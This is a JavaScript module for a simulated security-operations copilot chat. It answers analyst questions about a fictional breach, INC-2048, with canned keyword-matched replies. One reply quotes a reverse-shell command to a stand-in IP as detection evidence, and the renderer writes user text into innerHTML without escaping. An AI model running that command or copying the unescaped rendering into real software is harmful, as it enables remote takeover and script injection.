import { stateManager } from '../state.js';
import { showToast, formatDate } from './utils.js';

export function initCopilot() {
  const chatMessages = document.getElementById('copilotChatMessages');
  const inputBox = document.getElementById('copilotInputBox');
  const sendBtn = document.getElementById('copilotSendBtn');
  const clearBtn = document.getElementById('clearCopilotChatBtn');
  const suggestedChips = document.querySelectorAll('.suggested-chip');

  if (!chatMessages || !inputBox || !sendBtn) return;

  // Initial draw of existing messages
  renderMessages();

  // Subscribe to message updates
  stateManager.subscribe('copilotMessagesChanged', renderMessages);

  // Send message handler
  const handleSendMessage = () => {
    const text = inputBox.value.trim();
    if (!text) return;

    // 1. Add User Message
    stateManager.addCopilotMessage('user', text);
    inputBox.value = '';

    // Scroll to bottom
    setTimeout(() => {
      chatMessages.scrollTop = chatMessages.scrollHeight;
    }, 50);

    // 2. Simulate AI Processing & Response
    simulateAiResponse(text);
  };

  sendBtn.addEventListener('click', handleSendMessage);
  inputBox.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleSendMessage();
  });

  // Clear chat
  if (clearBtn) {
    clearBtn.addEventListener('click', () => {
      stateManager.clearCopilotMessages();
      showToast('Copilot conversation history reset.', 'info');
    });
  }

  // Click prompt template chips
  suggestedChips.forEach(chip => {
    chip.addEventListener('click', () => {
      const query = chip.getAttribute('data-query');
      inputBox.value = query;
      inputBox.focus();
    });
  });

  function renderMessages() {
    chatMessages.innerHTML = '';
    const messages = stateManager.state.copilotMessages;

    messages.forEach(msg => {
      const bubbleWrapper = document.createElement('div');
      bubbleWrapper.style.display = 'flex';
      bubbleWrapper.style.flexDirection = 'column';
      bubbleWrapper.style.alignItems = msg.sender === 'user' ? 'flex-end' : 'flex-start';
      bubbleWrapper.style.width = '100%';

      const bubble = document.createElement('div');
      bubble.className = `message-bubble ${msg.sender}`;
      
      // Parse markdown bold and newlines
      let htmlContent = msg.text
        .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
        .replace(/- (.*?)\n/g, '• $1<br/>')
        .replace(/\n/g, '<br/>');

      bubble.innerHTML = htmlContent;

      // Render Citations
      if (msg.citations && msg.citations.length > 0) {
        const citationsList = document.createElement('div');
        citationsList.className = 'citations-list';
        msg.citations.forEach(cit => {
          const chip = document.createElement('button');
          chip.className = 'citation-chip';
          chip.textContent = cit.id;
          chip.addEventListener('click', () => {
            handleCitationClick(cit);
          });
          citationsList.appendChild(chip);
        });
        bubble.appendChild(citationsList);
      }

      const meta = document.createElement('div');
      meta.className = 'message-meta';
      meta.textContent = msg.sender === 'copilot' ? 'Sentinel Copilot • Just now' : 'You • Just now';

      bubbleWrapper.appendChild(bubble);
      bubbleWrapper.appendChild(meta);
      chatMessages.appendChild(bubbleWrapper);
    });

    // Scroll to bottom
    chatMessages.scrollTop = chatMessages.scrollHeight;
  }

  function handleCitationClick(cit) {
    if (cit.type === 'alert') {
      const det = stateManager.state.detections.find(d => d.id === cit.id);
      if (det) {
        // Open details drawer
        const drawer = document.getElementById('detailsDrawer');
        if (drawer) {
          document.getElementById('drawerId').textContent = det.id;
          document.getElementById('drawerTitle').textContent = det.category;
          
          const sev = document.getElementById('drawerSeverity');
          sev.textContent = det.severity;
          sev.className = `badge ${det.severity.toLowerCase()}`;
          
          const risk = document.getElementById('drawerRiskScore');
          risk.textContent = `Risk: ${det.riskScore}`;
          risk.className = `score-indicator ${det.riskScore >= 90 ? 'critical' : det.riskScore >= 70 ? 'high' : 'medium'}`;

          document.getElementById('drawerConfidence').textContent = `Conf: ${det.confidence}%`;
          document.getElementById('drawerReason').textContent = det.reason;
          document.getElementById('drawerObserved').textContent = det.evidence.observed;
          document.getElementById('drawerInference').textContent = det.evidence.inference;
          document.getElementById('drawerNextSteps').textContent = det.evidence.nextSteps;

          drawer.classList.add('open');
          showToast(`Opened forensic log for ${cit.id}`, 'info');
        }
      }
    } else if (cit.type === 'incident') {
      stateManager.setSelectedIncident(cit.id);
      stateManager.setView('incidents');
      showToast(`Navigated to active workspace: ${cit.id}`, 'success');
    }
  }

  function simulateAiResponse(queryText) {
    const query = queryText.toLowerCase();
    let responseText = "";
    let citations = [];

    // Simple keyword-based QA router
    if (query.includes('why') && (query.includes('inc-2048') || query.includes('incident') || query.includes('detected'))) {
      responseText = "Incident **INC-2048** was flagged by the Sentinel Correlation Engine due to a fast-moving, multi-stage kill chain:\n" +
                     "1. Anomalous Kerberos brute force on the Domain Controller **srv-corp-ad-01** [DET-2026-101].\n" +
                     "2. An concurrent geolocation access (Tor Paris vs Office NYC WiFi) on wkst-dev-alice [DET-2026-102].\n" +
                     "3. Spawn of an interactive remote root bash shell via database process executor on srv-prod-db-01 [DET-2026-103].\n" +
                     "4. Massive 4.2GB exfiltration egress stream from cloud buckets to Netherlands [DET-2026-104].";
      citations = [
        { id: 'DET-2026-101', type: 'alert' },
        { id: 'DET-2026-102', type: 'alert' },
        { id: 'DET-2026-103', type: 'alert' },
        { id: 'DET-2026-104', type: 'alert' },
        { id: 'INC-2048', type: 'incident' }
      ];
    } else if (query.includes('summarize') || query.includes('summary')) {
      responseText = "**Summary for INC-2048**:\n" +
                     "- **Status:** Active Campaign (Uncontained)\n" +
                     "- **Attribution:** APT-29 Shadow-Net signatures (82% alignment)\n" +
                     "- **Kill Chain Phase:** Actions on Objectives (Data Exfiltration)\n" +
                     "- **Impact:** HIPAA customer database exposed (4.2GB egress to IP 203.0.113.110).\n\n" +
                     "Containment protocols are recommended immediately to isolate srv-prod-db-01 [DET-2026-103].";
      citations = [
        { id: 'INC-2048', type: 'incident' },
        { id: 'DET-2026-103', type: 'alert' }
      ];
    } else if (query.includes('asset') || query.includes('host') || query.includes('server')) {
      responseText = "Four monitored assets are actively affected by incident **INC-2048**:\n" +
                     "- **srv-corp-ad-01** (Active Directory Domain Controller - Critical health risk: 65)\n" +
                     "- **srv-prod-db-01** (Production Database - Compromised health risk: 89)\n" +
                     "- **wkst-dev-alice** (Developer Workstation - Medium risk: 42)\n" +
                     "- **aws-s3-customer-records** (S3 Bucket - Active egress: 54)\n\n" +
                     "I recommend isolating srv-prod-db-01 via EDR block script.";
      citations = [
        { id: 'INC-2048', type: 'incident' }
      ];
    } else if (query.includes('evidence') || query.includes('support') || query.includes('proof')) {
      responseText = "The following forensic evidence objects support the active alerts:\n" +
                     "- **Tor Exit IP 198.51.100.72** mapped to malicious geolocations [DET-2026-102].\n" +
                     "- **SQL Process Shell spawn:** `bash -i >& /dev/tcp/203.0.113.110` execution on DB server [DET-2026-103].\n" +
                     "- **Egress destination hosting provider IP 203.0.113.110** in Netherlands [DET-2026-104].";
      citations = [
        { id: 'DET-2026-102', type: 'alert' },
        { id: 'DET-2026-103', type: 'alert' },
        { id: 'DET-2026-104', type: 'alert' }
      ];
    } else if (query.includes('relat') || query.includes('connect')) {
      responseText = "Correlation engine suggests that **DET-2026-105** (Spear-phishing click by Alice Smith at 10:15 UTC) is the root compromise vector that provided the harvested credentials used in **INC-2048** starting at 11:22 UTC.";
      citations = [
        { id: 'DET-2026-105', type: 'alert' },
        { id: 'INC-2048', type: 'incident' }
      ];
    } else if (query.includes('investigate') || query.includes('next') || query.includes('do')) {
      responseText = "Recommended analyst actions for **INC-2048**:\n" +
                     "1. **Contain Host:** Select 'Isolate Hosts' in the incident workspace to block port egress.\n" +
                     "2. **Deploy Firewall Rule:** Block destination IP 203.0.113.110 at core core-router-01.\n" +
                     "3. **Revoke Session Credentials:** Reset credentials and rotate tokens for admin.svc.";
      citations = [
        { id: 'INC-2048', type: 'incident' }
      ];
    } else if (query.includes('report') || query.includes('generate')) {
      responseText = "I can generate incident briefs. I've initialized an Executive Threat Briefing draft. You can review, download, or print this from the **Reports** workspace.";
      citations = [
        { id: 'INC-2048', type: 'incident' }
      ];
    } else {
      responseText = "I've reviewed the security operations database. No anomalies matched the exact string '" + queryText + "'. However, I see active security telemetry relating to Kerberos credential abuse [DET-2026-101] and database terminal shell commands [DET-2026-103]. Please specify if you require diagnostic logs or network layout charts.";
      citations = [
        { id: 'DET-2026-101', type: 'alert' },
        { id: 'DET-2026-103', type: 'alert' }
      ];
    }

    // Add a typing delay simulation
    setTimeout(() => {
      stateManager.addCopilotMessage('copilot', responseText, citations);
    }, 800);
  }
}
